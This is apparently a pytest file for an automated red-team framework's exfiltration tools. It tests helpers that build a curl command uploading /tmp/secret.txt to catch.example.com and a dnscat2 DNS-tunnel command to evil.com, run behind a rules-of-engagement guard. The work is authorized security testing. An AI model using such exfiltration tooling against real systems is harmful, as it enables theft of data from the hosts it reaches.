"""Tests for the exfiltration tool wrappers (Phase 4, Task 7).

Two exfil techniques live in ``autored/tools.exfil`` — both have full
``@tool`` wrappers (``exfil_https`` for HTTPS POST exfil via curl,
``exfil_dns`` for DNS-tunnel exfil via dnscat2).

The three brief-mandated tests cover ``_build_exfil_https``,
``_build_exfil_dns``, and the ``ExfilResult`` model; two integration
tests cover the decorator-stacking regression catcher (Ruling 1) for
each ``@tool`` wrapper.
"""
from __future__ import annotations

import pytest

from autored.config import load_roe
from autored.roe_guard import register_roe
from autored.tools.exfil import (
    ExfilResult,
    _build_exfil_dns,
    _build_exfil_https,
    exfil_dns,
    exfil_https,
)


def test_build_exfil_https():
    """``_build_exfil_https`` returns a curl argv list that POSTs the
    file as a multipart upload to the catch server."""
    cmd = _build_exfil_https("catch.example.com", "/tmp/secret.txt")
    cmd_str = " ".join(cmd)
    assert "curl" in cmd_str or "wget" in cmd_str
    assert "catch.example.com" in cmd_str
    assert "/tmp/secret.txt" in cmd_str


def test_build_exfil_dns():
    """``_build_exfil_dns`` returns a dnscat2 argv list for DNS-tunnel
    exfil."""
    cmd = _build_exfil_dns("evil.com", "/tmp/secret.txt")
    cmd_str = " ".join(cmd)
    assert "dnscat" in cmd_str or "dns" in cmd_str.lower()


def test_exfil_result_model():
    """The result model accepts the brief-specified fields + defaults."""
    r = ExfilResult(
        method="https",
        source_host="10.10.10.5",
        data_size_bytes=1024,
        catch_server="catch.example.com",
        catch_server_log_path="/var/log/catch.log",
    )
    assert r.method == "https"
    assert r.source_host == "10.10.10.5"
    assert r.data_size_bytes == 1024
    assert r.catch_server == "catch.example.com"
    assert r.catch_server_log_path == "/var/log/catch.log"


@pytest.mark.asyncio
async def test_exfil_https_ainvoke_works_with_roe_guard(
    sandbox_roe_yaml, monkeypatch
):
    """Integration test: ``@tool`` outer + ``@roe_guard`` inner per Ruling 1.

    Per the T7 brief, ``exfil_https`` does NOT actually execute — it
    constructs the curl command string and saves it via ``_save_raw`` so
    the Phase 6 FootholdSessionManager can replay it on the foothold.
    The result records the ``catch_server`` + ``catch_server_log_path``
    so the operator can prove the data left the scope to a specific
    catch endpoint with a traceable log path.
    """
    roe = load_roe(sandbox_roe_yaml)
    register_roe("exfil-https-int", roe)

    async def fake_save_raw(*args, **kwargs):
        return "/tmp/fake/exfil_https_cmd.out"

    monkeypatch.setattr("autored.tools.exfil._save_raw", fake_save_raw)

    result = await exfil_https.ainvoke(
        {
            "catch_server": "catch.example.com",
            "file_path": "/tmp/secret.txt",
            "host_ip": "10.10.10.5",
            "engagement_id": "exfil-https-int",
        }
    )

    assert isinstance(result, ExfilResult)
    assert result.method == "https"
    assert result.source_host == "10.10.10.5"
    assert result.catch_server == "catch.example.com"
    # catch_server_log_path is operator-derived from host_ip so the
    # operator can grep the catch server's logs by source host.
    assert "10.10.10.5" in result.catch_server_log_path
    assert result.raw_output_path == "/tmp/fake/exfil_https_cmd.out"


@pytest.mark.asyncio
async def test_exfil_dns_ainvoke_works_with_roe_guard(
    sandbox_roe_yaml, monkeypatch
):
    """Integration test for ``exfil_dns`` — same rationale as
    ``test_exfil_https_ainvoke_works_with_roe_guard`` above."""
    roe = load_roe(sandbox_roe_yaml)
    register_roe("exfil-dns-int", roe)

    async def fake_save_raw(*args, **kwargs):
        return "/tmp/fake/exfil_dns_cmd.out"

    monkeypatch.setattr("autored.tools.exfil._save_raw", fake_save_raw)

    result = await exfil_dns.ainvoke(
        {
            "domain": "evil.com",
            "file_path": "/tmp/secret.txt",
            "host_ip": "10.10.10.5",
            "engagement_id": "exfil-dns-int",
        }
    )

    assert isinstance(result, ExfilResult)
    assert result.method == "dns"
    assert result.source_host == "10.10.10.5"
    assert result.catch_server == "evil.com"  # DNS-tunnel domain
    assert "10.10.10.5" in result.catch_server_log_path
    assert result.raw_output_path == "/tmp/fake/exfil_dns_cmd.out"
